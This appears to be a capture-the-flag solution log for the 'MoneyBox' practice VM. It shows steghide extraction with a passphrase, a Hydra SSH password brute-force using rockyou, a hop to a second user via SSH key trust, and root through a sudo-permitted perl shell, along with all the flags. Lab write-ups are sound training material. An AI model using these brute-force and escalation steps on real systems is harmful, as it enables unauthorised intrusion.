@@ -1,0 +1,102 @@
+KEY
+3xtr4ctd4t4
+
+
+root@kali:~# steghide extract -sf trytofind.jpg
+Enter passphrase: 
+wrote extracted data to "data.txt".
+
+
+user: renu
+
+root@kali:~# hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://192.168.43.80 -t 4
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-14 18:17:50
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://192.168.43.80:22/
+[STATUS] 38.00 tries/min, 38 tries in 00:01h, 14344361 to do in 6291:24h, 4 active
+[22][ssh] host: 192.168.43.80   login: renu   password: 987654321
+[STATUS] 4781466.33 tries/min, 14344399 tries in 00:03h, 1 to do in 00:01h, 2 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-14 18:21:07
+
+
+renu@MoneyBox:~$ id
+uid=1001(renu) gid=1001(renu) groups=1001(renu)
+renu@MoneyBox:~$ ls
+ftp  user1.txt
+renu@MoneyBox:~$ cat user1.txt 
+Yes...!
+You Got it User1 Flag
+
+ ==> us3r1{F14g:0ku74tbd3777y4}
+
+renu@MoneyBox:~$ 
+
+renu@MoneyBox:/home/lily$ cat user2.txt 
+Yeah.....
+You Got a User2 Flag
+
+==> us3r{F14g:tr5827r5wu6nklao}
+
+renu@MoneyBox:/home/lily$ 
+
+
+renu@MoneyBox:/home/lily/.ssh$ cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian
+renu@MoneyBox:/home/lily/.ssh$ 
+renu@MoneyBox:/home/lily/.ssh$ ssh lily@127.0.0.1
+Linux MoneyBox 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Apr 14 11:38:38 2021 from 127.0.0.1
+lily@MoneyBox:~$ 
+
+
+lily@MoneyBox:~$ sudo -l
+Matching Defaults entries for lily on MoneyBox:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lily may run the following commands on MoneyBox:
+    (ALL : ALL) NOPASSWD: /usr/bin/perl
+lily@MoneyBox:~$ 
+lily@MoneyBox:~$ 
+lily@MoneyBox:~$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+# ls -la
+total 28
+drwx------  3 root root 4096 Feb 26 09:28 .
+drwxr-xr-x 18 root root 4096 Feb 25 21:35 ..
+-rw-------  1 root root 2097 Feb 26 09:31 .bash_history
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwxr-xr-x  3 root root 4096 Feb 25 21:42 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root  228 Feb 26 09:27 .root.txt
+# cat .root.txt
+
+Congratulations.......!
+
+You Successfully completed MoneyBox
+
+Finally The Root Flag
+    ==> r00t{H4ckth3p14n3t}
+
+I'm Kirthik-KarvendhanT
+    It's My First CTF Box
+         
+instagram : ____kirthik____
+
+See You Back....
+       
+# 
+
+
